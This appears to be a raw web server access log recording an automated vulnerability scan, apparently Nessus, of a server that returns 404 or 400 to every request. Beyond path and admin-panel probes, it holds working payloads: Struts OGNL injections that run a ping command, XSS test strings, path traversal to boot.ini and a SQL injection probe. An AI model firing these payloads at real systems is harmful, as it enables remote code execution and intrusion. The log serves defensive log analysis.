127.0.0.1 - - [11/Oct/2023:10:03:18 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:08 -0700] "GET /login HTTP/1.1" 404 756
172.16.5.98 - - [11/Oct/2023:10:27:08 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:09 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:09 -0700] "GET /snmx-cgi/fxm.exe HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:27:09 -0700] "GET /..htaccess.swp HTTP/1.1" 404 765
172.16.5.98 - - [11/Oct/2023:10:27:09 -0700] "GET null HTTP/1.1" 400 2030
172.16.5.98 - - [11/Oct/2023:10:27:09 -0700] "GET /.htaccess.1 HTTP/1.1" 404 762
172.16.5.98 - - [11/Oct/2023:10:27:10 -0700] "GET /.htaccess.~1~ HTTP/1.1" 404 764
172.16.5.98 - - [11/Oct/2023:10:27:10 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:11 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:12 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:13 -0700] "GET /cgi-bin/help.cgi HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:27:13 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:15 -0700] "GET /platform-ui/ HTTP/1.1" 404 767
172.16.5.98 - - [11/Oct/2023:10:27:15 -0700] "GET /server-info HTTP/1.1" 404 762
172.16.5.98 - - [11/Oct/2023:10:27:15 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:16 -0700] "GET /index.html HTTP/1.1" 404 761
172.16.5.98 - - [11/Oct/2023:10:27:16 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:17 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:17 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:18 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:18 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:19 -0700] "GET /cgi-bin/hi HTTP/1.1" 404 765
172.16.5.98 - - [11/Oct/2023:10:27:20 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:20 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:21 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:21 -0700] "GET /pluto/portal/ HTTP/1.1" 404 772
172.16.5.98 - - [11/Oct/2023:10:27:22 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:22 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:23 -0700] "GET /nifi/ HTTP/1.1" 404 760
172.16.5.98 - - [11/Oct/2023:10:27:25 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:25 -0700] "GET /cgi-bin/index.cgi HTTP/1.1" 404 772
172.16.5.98 - - [11/Oct/2023:10:27:25 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:30 -0700] "GET /cgi-bin/index.pl HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:27:31 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:34 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:36 -0700] "GET /cgi-bin/index.sh HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:27:36 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:36 -0700] "GET / HTTP/1.1" 400 1937
172.16.5.98 - - [11/Oct/2023:10:27:37 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:41 -0700] "GET /cgi-bin/login.cgi HTTP/1.1" 404 772
172.16.5.98 - - [11/Oct/2023:10:27:42 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:42 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:42 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:44 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:45 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:46 -0700] "GET /unified-console.html HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:27:46 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:46 -0700] "GET /api/v1/?format=api HTTP/1.1" 404 766
172.16.5.98 - - [11/Oct/2023:10:27:46 -0700] "GET /cgi-bin/mailit.pl HTTP/1.1" 404 772
172.16.5.98 - - [11/Oct/2023:10:27:47 -0700] "GET /login/ HTTP/1.1" 404 761
172.16.5.98 - - [11/Oct/2023:10:27:47 -0700] "GET /api/v1/?format=api HTTP/1.1" 404 766
172.16.5.98 - - [11/Oct/2023:10:27:47 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:47 -0700] "GET // HTTP/1.1" 404 756
172.16.5.98 - - [11/Oct/2023:10:27:47 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:47 -0700] "GET /libs/granite/core/content/login.html HTTP/1.1" 404 803
172.16.5.98 - - [11/Oct/2023:10:27:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:48 -0700] "GET /admin/airflow/login HTTP/1.1" 404 778
172.16.5.98 - - [11/Oct/2023:10:27:48 -0700] "GET /system/login HTTP/1.1" 404 767
172.16.5.98 - - [11/Oct/2023:10:27:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:48 -0700] "GET /system/login HTTP/1.1" 404 767
172.16.5.98 - - [11/Oct/2023:10:27:48 -0700] "GET /courier/web/1000@/wmLogin.html HTTP/1.1" 404 793
172.16.5.98 - - [11/Oct/2023:10:27:50 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:50 -0700] "GET /servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&service= HTTP/1.0" 404 768
172.16.5.98 - - [11/Oct/2023:10:27:51 -0700] "GET /chassis/config/GeneralChassisConfig.html HTTP/1.1" 404 799
172.16.5.98 - - [11/Oct/2023:10:27:51 -0700] "GET /this_page_should_not_exist.htm HTTP/1.1" 404 781
172.16.5.98 - - [11/Oct/2023:10:27:51 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:27:51 -0700] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 782
172.16.5.98 - - [11/Oct/2023:10:27:51 -0700] "GET /qwe/qwe/index.html HTTP/1.1" 404 777
172.16.5.98 - - [11/Oct/2023:10:27:56 -0700] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 781
172.16.5.98 - - [11/Oct/2023:10:28:02 -0700] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 789
172.16.5.98 - - [11/Oct/2023:10:28:07 -0700] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 788
172.16.5.98 - - [11/Oct/2023:10:28:12 -0700] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 782
172.16.5.98 - - [11/Oct/2023:10:28:16 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:28:16 -0700] "GET /favicon2.iso HTTP/1.1" 404 763
172.16.5.98 - - [11/Oct/2023:10:28:16 -0700] "GET /favicon.iso HTTP/1.1" 404 762
172.16.5.98 - - [11/Oct/2023:10:28:17 -0700] "GET /cgi-bin/printenv HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:28:22 -0700] "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 775
172.16.5.98 - - [11/Oct/2023:10:28:28 -0700] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 777
172.16.5.98 - - [11/Oct/2023:10:28:33 -0700] "GET /cgi-bin/search HTTP/1.1" 404 769
172.16.5.98 - - [11/Oct/2023:10:28:38 -0700] "GET /cgi-bin/search.cgi HTTP/1.1" 404 773
172.16.5.98 - - [11/Oct/2023:10:28:43 -0700] "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 784
172.16.5.98 - - [11/Oct/2023:10:28:50 -0700] "GET /cgi-bin/status HTTP/1.1" 404 769
172.16.5.98 - - [11/Oct/2023:10:28:56 -0700] "GET /cgi-bin/status.cgi HTTP/1.1" 404 773
172.16.5.98 - - [11/Oct/2023:10:29:01 -0700] "GET /cgi-bin/test.cgi HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:29:09 -0700] "GET /cgi-bin/test.sh HTTP/1.1" 404 770
172.16.5.98 - - [11/Oct/2023:10:29:14 -0700] "GET /cgi-bin/test-cgi HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:29:19 -0700] "GET /cgi-bin/upload.cgi HTTP/1.1" 404 773
172.16.5.98 - - [11/Oct/2023:10:29:25 -0700] "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 775
172.16.5.98 - - [11/Oct/2023:10:29:30 -0700] "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 774
172.16.5.98 - - [11/Oct/2023:10:29:35 -0700] "GET /cgi-bin/wa HTTP/1.1" 404 765
172.16.5.98 - - [11/Oct/2023:10:29:40 -0700] "GET /cgi-bin/wa.cgi HTTP/1.1" 404 769
172.16.5.98 - - [11/Oct/2023:10:29:48 -0700] "GET /cgi-bin/wa.exe HTTP/1.1" 404 769
172.16.5.98 - - [11/Oct/2023:10:29:53 -0700] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 772
172.16.5.98 - - [11/Oct/2023:10:29:59 -0700] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 775
172.16.5.98 - - [11/Oct/2023:10:30:06 -0700] "GET /cgi-mod/index.cgi HTTP/1.1" 404 772
172.16.5.98 - - [11/Oct/2023:10:30:12 -0700] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 781
172.16.5.98 - - [11/Oct/2023:10:30:19 -0700] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 780
172.16.5.98 - - [11/Oct/2023:10:30:24 -0700] "GET /index.cgi HTTP/1.1" 404 760
172.16.5.98 - - [11/Oct/2023:10:30:29 -0700] "GET /index.pl HTTP/1.1" 404 759
172.16.5.98 - - [11/Oct/2023:10:30:34 -0700] "GET /index.sh HTTP/1.1" 404 759
172.16.5.98 - - [11/Oct/2023:10:30:39 -0700] "GET /nph-mr.cgi HTTP/1.1" 404 761
172.16.5.98 - - [11/Oct/2023:10:30:45 -0700] "GET /query.cgi HTTP/1.1" 404 760
172.16.5.98 - - [11/Oct/2023:10:30:50 -0700] "GET /session_login.cgi HTTP/1.1" 404 768
172.16.5.98 - - [11/Oct/2023:10:30:54 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:30:54 -0700] "GET /axis2/services/CUPMService/ping HTTP/1.1" 404 794
172.16.5.98 - - [11/Oct/2023:10:30:55 -0700] "GET /dfcweb/lib/cupm/nls/applicationproperties.js HTTP/1.1" 404 811
172.16.5.98 - - [11/Oct/2023:10:30:55 -0700] "GET /show_bug.cgi HTTP/1.1" 404 763
172.16.5.98 - - [11/Oct/2023:10:30:56 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:30:56 -0700] "GET /emsam/index.html HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:30:59 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:30:59 -0700] "GET /login.php HTTP/1.1" 404 760
172.16.5.98 - - [11/Oct/2023:10:31:00 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:00 -0700] "GET /test HTTP/1.1" 404 755
172.16.5.98 - - [11/Oct/2023:10:31:06 -0700] "GET /test.cgi HTTP/1.1" 404 759
172.16.5.98 - - [11/Oct/2023:10:31:11 -0700] "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 778
172.16.5.98 - - [11/Oct/2023:10:31:16 -0700] "GET /whois.cgi HTTP/1.1" 404 760
172.16.5.98 - - [11/Oct/2023:10:31:18 -0700] "GET %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%20674269514e7177567058%20172.16.5.98%27%29%29%7D// HTTP/1.1" 400 795
172.16.5.98 - - [11/Oct/2023:10:31:19 -0700] "POST / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:21 -0700] "GET /wp-login.php HTTP/1.1" 404 763
172.16.5.98 - - [11/Oct/2023:10:31:26 -0700] "GET //(%23mem=%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]):index.xhtml?cmd=ping%20%2dc%203%20%2dp%204b4b5771594331304665%20172.16.5.98 HTTP/1.1" 400 762
172.16.5.98 - - [11/Oct/2023:10:31:28 -0700] "GET %24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p%20674269514e7177567058%20172.16.5.98%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D// HTTP/1.1" 400 795
172.16.5.98 - - [11/Oct/2023:10:31:29 -0700] "GET /wwwadmin.cgi HTTP/1.1" 404 763
172.16.5.98 - - [11/Oct/2023:10:31:30 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:30 -0700] "GET null HTTP/1.1" 400 2504
172.16.5.98 - - [11/Oct/2023:10:31:30 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:30 -0700] "GET null HTTP/1.1" 400 2170
172.16.5.98 - - [11/Oct/2023:10:31:31 -0700] "GET null HTTP/1.1" 400 2842
172.16.5.98 - - [11/Oct/2023:10:31:31 -0700] "GET /?redirect:$%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p457376776b48417a7037%20172.16.5.98%27%29.getInputStream%28%29%29%7d HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:36 -0700] "GET /?redirect:%24%7B57550614%2b16044095%7D HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:37 -0700] "GET /wwwboard.cgi HTTP/1.1" 404 763
172.16.5.98 - - [11/Oct/2023:10:31:37 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:37 -0700] "GET null HTTP/1.1" 400 2392
172.16.5.98 - - [11/Oct/2023:10:31:38 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:38 -0700] "POST /flex2gateway/http HTTP/1.1" 404 772
172.16.5.98 - - [11/Oct/2023:10:31:38 -0700] "POST /messagebroker/http HTTP/1.1" 404 773
172.16.5.98 - - [11/Oct/2023:10:31:38 -0700] "POST /blazeds/messagebroker/http HTTP/1.1" 404 785
172.16.5.98 - - [11/Oct/2023:10:31:38 -0700] "POST /lcds/messagebroker/http HTTP/1.1" 404 782
172.16.5.98 - - [11/Oct/2023:10:31:38 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:38 -0700] "GET /internalServerReporting.php HTTP/1.1" 404 778
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET %24%7B%7B57550614+16044095%7D%7D// HTTP/1.1" 400 795
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET /Websense/cgi-bin/WsCgiLogin.exe?Page=login&UserName=nessus%22%3e%3cscript%3ealert('websense_username_xss.nasl')%3c%2fscript%3e HTTP/1.1" 404 790
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET /webhost HTTP/1.1" 404 758
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e HTTP/1.1" 404 792
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET /console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e HTTP/1.1" 404 794
172.16.5.98 - - [11/Oct/2023:10:31:39 -0700] "GET null HTTP/1.1" 400 2186
172.16.5.98 - - [11/Oct/2023:10:31:41 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:41 -0700] "GET /LoginPage.do HTTP/1.1" 404 763
172.16.5.98 - - [11/Oct/2023:10:31:41 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:41 -0700] "GET /home.jsf?autoScroll=0%2c275)%3b%2f%2f--%3e%3c%2fscript%3e%3cscript%3ealert('myfaces_tomahawk_autoscroll_xss.nasl' HTTP/1.1" 404 759
172.16.5.98 - - [11/Oct/2023:10:31:41 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:41 -0700] "GET /index.aspx HTTP/1.1" 404 761
172.16.5.98 - - [11/Oct/2023:10:31:41 -0700] "GET /Default.aspx HTTP/1.1" 404 763
172.16.5.98 - - [11/Oct/2023:10:31:42 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:42 -0700] "GET /item.fts?href=%22%3E%3Cscript%3Ealert(%22ftgate_44002.nasl%22)%3C%2Fscript%3E%3B HTTP/1.1" 404 759
172.16.5.98 - - [11/Oct/2023:10:31:42 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:42 -0700] "GET /xampp/cgi.cgi HTTP/1.1" 404 768
172.16.5.98 - - [11/Oct/2023:10:31:42 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:42 -0700] "GET /login?user=**%3Cscript%3EJavaScript:alert('cpanel_login_user_xss.nasl')%3B%3C%2Fscript%3E HTTP/1.1" 404 756
172.16.5.98 - - [11/Oct/2023:10:31:43 -0700] "GET null HTTP/1.1" 400 2182
172.16.5.98 - - [11/Oct/2023:10:31:43 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET /admin/statistics/ConfigureStatistics HTTP/1.1" 404 795
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET /altercast/AlterCast?op=%3cscript%3ealert(%22adobe_document_server_61.nasl%22)%3c%2fscript%3e HTTP/1.1" 404 774
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET /nul.dbm HTTP/1.1" 404 758
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET /index.php/123 HTTP/1.1" 404 768
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET /status HTTP/1.1" 404 757
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 783
172.16.5.98 - - [11/Oct/2023:10:31:44 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:45 -0700] "GET null HTTP/1.1" 400 2170
172.16.5.98 - - [11/Oct/2023:10:31:45 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:45 -0700] "GET /index.jsp HTTP/1.1" 404 739
172.16.5.98 - - [11/Oct/2023:10:31:45 -0700] "GET /index.jsp HTTP/1.1" 404 739
172.16.5.98 - - [11/Oct/2023:10:31:46 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:47 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:47 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:47 -0700] "GET null HTTP/1.1" 400 2184
172.16.5.98 - - [11/Oct/2023:10:31:47 -0700] "GET /scripts/w3who.dll HTTP/1.1" 404 772
172.16.5.98 - - [11/Oct/2023:10:31:47 -0700] "GET /XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.jsp HTTP/1.1" 404 984
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET /Reporting/login/change_password.php?enable_auth=0 HTTP/1.1" 404 794
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET /cgi-bin/filescan HTTP/1.1" 404 771
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET /enter.php?goto=%2F HTTP/1.1" 404 760
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "POST / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET /struts/webconsole.html HTTP/1.1" 404 777
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET null HTTP/1.1" 400 2046
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:48 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:49 -0700] "GET /web.config HTTP/1.1" 404 761
172.16.5.98 - - [11/Oct/2023:10:31:49 -0700] "-" 400 3112
172.16.5.98 - - [11/Oct/2023:10:31:49 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:49 -0700] "GET /sc3/console.php?psid=101 HTTP/1.1" 404 770
172.16.5.98 - - [11/Oct/2023:10:31:49 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:50 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:50 -0700] "GET /.anydomain.test HTTP/1.0" 404 766
172.16.5.98 - - [11/Oct/2023:10:31:50 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:50 -0700] "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 404 807
172.16.5.98 - - [11/Oct/2023:10:31:50 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:51 -0700] "GET /dagent/checkprofile.asp?agentid=11111'plus_agentid_sql_injection.nasl HTTP/1.1" 404 778
172.16.5.98 - - [11/Oct/2023:10:31:52 -0700] "GET null HTTP/1.1" 400 2498
172.16.5.98 - - [11/Oct/2023:10:31:52 -0700] "GET //struts/webconsole.html HTTP/1.1" 404 782
172.16.5.98 - - [11/Oct/2023:10:31:52 -0700] "GET null HTTP/1.1" 400 2148
172.16.5.98 - - [11/Oct/2023:10:31:52 -0700] "GET null HTTP/1.1" 400 2056
172.16.5.98 - - [11/Oct/2023:10:31:53 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:54 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:54 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:54 -0700] "GET / HTTP/1.1" 404 751
172.16.5.98 - - [11/Oct/2023:10:31:54 -0700] "GET null HTTP/1.1" 400 2190
172.16.5.98 - - [11/Oct/2023:10:31:55 -0700] "GET / HTTP/1.1" 404 751
